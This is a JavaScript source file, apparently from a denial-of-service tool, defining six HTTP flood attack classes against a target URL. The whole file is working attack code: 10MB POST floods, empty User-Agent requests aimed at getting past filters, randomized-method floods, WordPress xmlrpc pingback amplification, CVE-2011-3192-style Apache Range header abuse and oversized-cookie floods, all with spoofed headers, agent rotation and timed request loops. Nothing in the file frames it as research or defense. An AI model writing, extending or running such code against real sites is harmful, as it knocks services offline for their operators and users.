import http from 'http';
import https from 'https';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { logger } from '../../utils/logger.js';

/**
 * STRESS Attack - Large POST with massive payload
 */
export class StressAttack {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = rpc;
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    generateHeaders() {
        const headers = {
            'Host': this.url.host,
            'User-Agent': this.userAgents.length > 0 
                ? Tools.randomChoice(this.userAgents)
                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            ...Tools.generateSpoofHeaders(this.url.host)
        };

        if (this.referers.length > 0) {
            headers['Referer'] = Tools.randomChoice(this.referers) + this.url.href;
        }

        return headers;
    }

    generateLargePayload() {
        // Generate very large payload (10MB)
        const size = 10 * 1024 * 1024;
        return Buffer.alloc(size, 'A');
    }

    async attack() {
        return new Promise((resolve) => {
            const payload = this.generateLargePayload();
            const headers = this.generateHeaders();
            headers['Content-Length'] = payload.length;

            const options = {
                hostname: this.url.hostname,
                port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                path: this.url.pathname + this.url.search,
                method: 'POST',
                headers: headers,
                timeout: 2000
            };

            const protocol = this.url.protocol === 'https:' ? https : http;

            const makeRequest = () => {
                if (!this.active) {
                    resolve();
                    return;
                }

                const req = protocol.request(options, (res) => {
                    REQUESTS_SENT.add(1);
                    res.on('data', () => {});
                    res.on('end', () => {});
                });

                req.on('error', () => {});
                req.on('timeout', () => req.destroy());

                req.write(payload);
                req.end();
                
                BYTES_SENT.add(payload.length + JSON.stringify(options.headers).length);
            };

            for (let i = 0; i < this.rpc; i++) {
                makeRequest();
            }

            setTimeout(resolve, 100);
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * NULL Attack - Null User-Agent bypass
 */
export class NullAttack {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = rpc;
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    generateHeaders() {
        const headers = {
            'Host': this.url.host,
            'User-Agent': '', // Null/Empty User-Agent
            'Accept': '*/*',
            'Connection': 'keep-alive',
            ...Tools.generateSpoofHeaders(this.url.host)
        };

        return headers;
    }

    async attack() {
        return new Promise((resolve) => {
            const options = {
                hostname: this.url.hostname,
                port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                path: this.url.pathname + this.url.search,
                method: 'GET',
                headers: this.generateHeaders(),
                timeout: 900
            };

            const protocol = this.url.protocol === 'https:' ? https : http;

            const makeRequest = () => {
                if (!this.active) {
                    resolve();
                    return;
                }

                const req = protocol.request(options, (res) => {
                    REQUESTS_SENT.add(1);
                    res.on('data', () => {});
                    res.on('end', () => {});
                });

                req.on('error', () => {});
                req.on('timeout', () => req.destroy());

                req.end();
                BYTES_SENT.add(JSON.stringify(options.headers).length);
            };

            for (let i = 0; i < this.rpc; i++) {
                makeRequest();
            }

            setTimeout(resolve, 100);
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * DYN Attack - Dynamic randomized attack
 */
export class DynamicAttack {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = rpc;
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
        this.methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'PATCH'];
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    generateHeaders() {
        const randomHeaders = {};
        
        // Random header count
        const headerCount = Tools.randomInt(5, 15);
        
        for (let i = 0; i < headerCount; i++) {
            const headerName = `X-${Tools.randomString(8)}`;
            randomHeaders[headerName] = Tools.randomString(16);
        }

        const headers = {
            'Host': this.url.host,
            'User-Agent': this.userAgents.length > 0 
                ? Tools.randomChoice(this.userAgents)
                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Connection': Tools.randomChoice(['keep-alive', 'close']),
            ...randomHeaders,
            ...Tools.generateSpoofHeaders(this.url.host)
        };

        if (this.referers.length > 0) {
            headers['Referer'] = Tools.randomChoice(this.referers) + this.url.href;
        }

        return headers;
    }

    generatePayload() {
        const size = Tools.randomInt(100, 10000);
        return Tools.randomString(size);
    }

    async attack() {
        return new Promise((resolve) => {
            const method = Tools.randomChoice(this.methods);
            const headers = this.generateHeaders();
            
            let payload = null;
            if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
                payload = this.generatePayload();
                headers['Content-Type'] = Tools.randomChoice([
                    'application/json',
                    'application/x-www-form-urlencoded',
                    'multipart/form-data',
                    'text/plain'
                ]);
                headers['Content-Length'] = Buffer.byteLength(payload);
            }

            // Randomize path
            const randomPath = this.url.pathname + 
                (this.url.search || '?') + 
                `&${Tools.randomString(8)}=${Tools.randomString(16)}`;

            const options = {
                hostname: this.url.hostname,
                port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                path: randomPath,
                method: method,
                headers: headers,
                timeout: 900
            };

            const protocol = this.url.protocol === 'https:' ? https : http;

            const makeRequest = () => {
                if (!this.active) {
                    resolve();
                    return;
                }

                const req = protocol.request(options, (res) => {
                    REQUESTS_SENT.add(1);
                    res.on('data', () => {});
                    res.on('end', () => {});
                });

                req.on('error', () => {});
                req.on('timeout', () => req.destroy());

                if (payload) {
                    req.write(payload);
                    BYTES_SENT.add(Buffer.byteLength(payload));
                }
                
                req.end();
                BYTES_SENT.add(JSON.stringify(options.headers).length);
            };

            for (let i = 0; i < this.rpc; i++) {
                makeRequest();
            }

            setTimeout(resolve, 100);
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * XMLRPC Attack - WordPress XMLRPC exploitation
 */
export class XMLRPCAttack {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        // Force XMLRPC endpoint
        if (!this.url.pathname.includes('xmlrpc.php')) {
            this.url.pathname = '/xmlrpc.php';
        }
        this.duration = duration;
        this.rpc = rpc;
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    generatePayload() {
        // Amplification attack using pingback
        const xmlPayload = `<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://${Tools.randomString(10)}.com</string></value></param>
<param><value><string>${this.url.href}</string></value></param>
</params>
</methodCall>`;
        return xmlPayload;
    }

    async attack() {
        return new Promise((resolve) => {
            const payload = this.generatePayload();
            const headers = {
                'Host': this.url.host,
                'User-Agent': this.userAgents.length > 0 
                    ? Tools.randomChoice(this.userAgents)
                    : 'Mozilla/5.0',
                'Content-Type': 'text/xml',
                'Content-Length': Buffer.byteLength(payload),
                'Connection': 'keep-alive'
            };

            const options = {
                hostname: this.url.hostname,
                port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                path: this.url.pathname,
                method: 'POST',
                headers: headers,
                timeout: 900
            };

            const protocol = this.url.protocol === 'https:' ? https : http;

            const makeRequest = () => {
                if (!this.active) {
                    resolve();
                    return;
                }

                const req = protocol.request(options, (res) => {
                    REQUESTS_SENT.add(1);
                    res.on('data', () => {});
                    res.on('end', () => {});
                });

                req.on('error', () => {});
                req.on('timeout', () => req.destroy());

                req.write(payload);
                req.end();
                
                BYTES_SENT.add(Buffer.byteLength(payload) + JSON.stringify(headers).length);
            };

            for (let i = 0; i < this.rpc; i++) {
                makeRequest();
            }

            setTimeout(resolve, 100);
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * Apache Range Attack - CVE-2011-3192 style
 */
export class ApacheRangeAttack {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = rpc;
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    generateRangeHeader() {
        // Multiple overlapping ranges to cause server load
        let ranges = 'bytes=';
        for (let i = 0; i < 300; i++) {
            ranges += `${i * 1000}-${i * 1000 + 999},`;
        }
        return ranges.slice(0, -1);
    }

    async attack() {
        return new Promise((resolve) => {
            const headers = {
                'Host': this.url.host,
                'User-Agent': this.userAgents.length > 0 
                    ? Tools.randomChoice(this.userAgents)
                    : 'Mozilla/5.0',
                'Range': this.generateRangeHeader(),
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive'
            };

            const options = {
                hostname: this.url.hostname,
                port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                path: this.url.pathname + this.url.search,
                method: 'GET',
                headers: headers,
                timeout: 900
            };

            const protocol = this.url.protocol === 'https:' ? https : http;

            const makeRequest = () => {
                if (!this.active) {
                    resolve();
                    return;
                }

                const req = protocol.request(options, (res) => {
                    REQUESTS_SENT.add(1);
                    res.on('data', () => {});
                    res.on('end', () => {});
                });

                req.on('error', () => {});
                req.on('timeout', () => req.destroy());

                req.end();
                BYTES_SENT.add(JSON.stringify(headers).length);
            };

            for (let i = 0; i < this.rpc; i++) {
                makeRequest();
            }

            setTimeout(resolve, 100);
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * Cookie-based Attack
 */
export class CookieAttack {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = rpc;
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    generateCookies() {
        // Generate many cookies to increase request size
        let cookies = [];
        for (let i = 0; i < 50; i++) {
            cookies.push(`${Tools.randomString(10)}=${Tools.randomString(100)}`);
        }
        return cookies.join('; ');
    }

    async attack() {
        return new Promise((resolve) => {
            const headers = {
                'Host': this.url.host,
                'User-Agent': this.userAgents.length > 0 
                    ? Tools.randomChoice(this.userAgents)
                    : 'Mozilla/5.0',
                'Cookie': this.generateCookies(),
                'Accept': '*/*',
                'Connection': 'keep-alive',
                ...Tools.generateSpoofHeaders(this.url.host)
            };

            const options = {
                hostname: this.url.hostname,
                port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                path: this.url.pathname + this.url.search,
                method: 'GET',
                headers: headers,
                timeout: 900
            };

            const protocol = this.url.protocol === 'https:' ? https : http;

            const makeRequest = () => {
                if (!this.active) {
                    resolve();
                    return;
                }

                const req = protocol.request(options, (res) => {
                    REQUESTS_SENT.add(1);
                    res.on('data', () => {});
                    res.on('end', () => {});
                });

                req.on('error', () => {});
                req.on('timeout', () => req.destroy());

                req.end();
                BYTES_SENT.add(JSON.stringify(headers).length);
            };

            for (let i = 0; i < this.rpc; i++) {
                makeRequest();
            }

            setTimeout(resolve, 100);
        });
    }

    stop() {
        this.active = false;
    }
}
